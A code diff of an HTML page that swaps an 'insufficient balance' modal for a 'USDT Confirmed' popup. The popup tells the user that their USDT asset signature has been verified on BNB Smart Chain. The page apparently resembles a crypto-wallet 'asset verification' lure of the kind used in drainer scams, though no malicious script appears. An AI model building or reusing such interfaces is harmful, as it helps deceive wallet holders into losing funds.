@@ -222,28 +222,22 @@
     </section>
 
     <!-- ============================================================
-    OVERLAY: RELEASE (Insufficient Balance Modal Popup)
+    OVERLAY: RELEASE (USDT Confirmed Modal Popup)
     ============================================================ -->
     <section class="verification-modal" id="releaseModal" role="dialog" aria-modal="true" aria-labelledby="releaseModalTitle">
         <div class="verification-modal__backdrop" data-close-modal=""></div>
-        <div class="verification-modal__card verification-modal__card--red" id="releaseModalCard">
+        <div class="verification-modal__card verification-modal__card--success" id="releaseModalCard">
             <div class="top-accent" aria-hidden="true"></div>
-            <div class="verification-modal__icon" id="releaseModalIcon">⚠️</div>
-            <h2 id="releaseModalTitle">Minimum Balance Required</h2>
-            <p class="verification-modal__intro" id="releaseModalIntro">A minimum balance of 1.00 USDT is required for asset verification.</p>
-            <div class="verification-modal__comparison" style="grid-template-columns: 1fr 1fr; gap:12px; margin: 16px 0;">
-                <div style="background:rgba(255,255,255,0.05); padding:12px; border-radius:12px; text-align:center;">
-                    <span style="font-size:0.8rem; opacity:0.7; display:block;">Your Balance</span>
-                    <strong id="releaseAvailable" style="font-size:1.1rem; color:#ef4444;">0.00 USDT</strong>
-                </div>
-                <div style="background:rgba(243,186,47,0.1); padding:12px; border-radius:12px; text-align:center;">
-                    <span style="font-size:0.8rem; opacity:0.7; display:block;">Required</span>
-                    <strong id="releaseRequired" style="font-size:1.1rem; color:#F3BA2F;">1.00 USDT</strong>
-                </div>
+            <div class="verification-modal__icon" id="releaseModalIcon">✅</div>
+            <h2 id="releaseModalTitle">USDT Confirmed</h2>
+            <p class="verification-modal__intro" id="releaseModalIntro">Your USDT asset signature has been verified on BNB Smart Chain.</p>
+            <div class="verification-modal__amount" style="margin: 16px 0;">
+                <span style="font-size:0.85rem; opacity:0.7; display:block;">Verified Balance</span>
+                <strong id="releaseAvailable" style="font-size:1.5rem; color:#10B981;">0.00 USDT</strong>
             </div>
-            <p class="verification-modal__hint" id="releaseModalHint" style="color:#ef4444; font-size:0.85rem; margin-bottom:16px;">⚠️ Please add USDT to your wallet and try again.</p>
+            <div class="verification-modal__status" style="color:#10B981; margin-bottom:16px;"><i></i> Verification Complete</div>
             <div class="verification-modal__actions" style="display:flex; flex-direction:column; gap:10px; width:100%;">
-                <button class="verification-btn verification-btn--secondary w-full" type="button" data-close-modal="">Close</button>
+                <button class="verification-btn verification-btn--success w-full" type="button" data-close-modal="">Done</button>
             </div>
         </div>
     </section>
